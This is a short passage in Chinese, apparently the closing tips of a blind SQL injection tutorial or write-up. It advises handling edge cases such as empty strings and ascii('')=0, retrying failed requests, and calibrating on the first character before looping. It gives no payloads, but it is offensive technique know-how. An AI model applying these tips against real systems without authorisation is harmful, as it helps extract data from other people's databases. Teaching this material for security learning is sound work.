- **脚本要能处理边界**：越界返回空串、`ascii('')=0`、请求失败要重试，这些细节决定脚本能不能一次跑通。

最后留一条经验：**盲注脚本先校准、再跑全量；先确认一位、再写循环。** 只要第一位的真假判断是对的，后面的字符只是重复同样的动作。
